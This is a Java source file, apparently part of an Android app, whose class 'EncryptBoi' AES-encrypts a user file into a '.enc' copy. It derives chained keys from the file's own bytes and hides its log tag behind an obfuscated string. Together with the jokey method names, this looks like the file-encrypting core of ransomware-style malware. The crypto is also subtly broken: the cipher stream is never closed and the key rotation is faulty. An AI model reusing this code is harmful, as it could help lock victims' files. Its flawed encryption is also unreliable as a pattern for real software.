package com.example.myapplication.workers;

import android.content.Context;
import android.util.Log;

import com.example.myapplication.R;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.Arrays;

import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class EncryptBoi {
    private static byte[] keyBytes;
    private static IvParameterSpec iv;

    public static byte[] weeeeeeeeeeeeee(Context context, File file, byte[] boom){
        String LOG_TAG = new GimmeString(context.getString(R.string.log)).decryptBoi();
        keyBytes = boom;
        byte[] nextKeys = new byte[32];
        try {
            byte[] ivBytes = new byte[16];
            new SecureRandom().nextBytes(ivBytes);
            iv =  new IvParameterSpec(ivBytes);
            FileInputStream fis = new FileInputStream(file);
            byte[] bytes = new byte[65536];
            fis.read(bytes);
            for(int i = 0;i<nextKeys.length;i++){
                nextKeys[i] = bytes[i];
            }
            blahblah(file);
            bwoahhhhh(file,10);
            Log.i(LOG_TAG, Arrays.toString(ivBytes));
        } catch (NoSuchAlgorithmException | InvalidAlgorithmParameterException | InvalidKeyException | NoSuchPaddingException | IOException  e) {
            Log.e(LOG_TAG, "shit", e);
        }
        return nextKeys;
    }

    private static int bwoahhhhh(File file,int i) throws NoSuchAlgorithmException, IOException, InvalidAlgorithmParameterException, InvalidKeyException, NoSuchPaddingException {
        if(i <= 1){
            blahblah(file);
            return i;
        }
        else{
            for(int x = 0;x<keyBytes.length;x++){
                keyBytes[0] = circles(keyBytes[0]);
            }
            return bwoahhhhh(file,i-1) + bwoahhhhh(file,i-2);
        }
    }
    private static byte circles(byte boom){
        return (byte) (boom >>> 2 | boom << (Integer.SIZE - 2));
    }
    private static void blahblah(File file) throws IOException, NoSuchAlgorithmException, InvalidAlgorithmParameterException, InvalidKeyException, NoSuchPaddingException {
        Cipher cipher  = Cipher.getInstance("AES/CBC/PKCS5Padding");
        Key key = new SecretKeySpec(keyBytes,"AES");
        cipher.init(Cipher.ENCRYPT_MODE,key,iv);
        FileInputStream fis = new FileInputStream(file);
        File encrypted = new File(file.getAbsolutePath().concat(".enc"));
        FileOutputStream fos = new FileOutputStream(encrypted);
        CipherOutputStream cos = new CipherOutputStream(fos,cipher);
        int z;
        byte[] bytes = new byte[65536];
        z = fis.read(bytes);
        while(z!=-1){
            cos.write(bytes,0,z);
            z = fis.read(bytes);
        }
        fis.close();
        fos.close();
    }
}
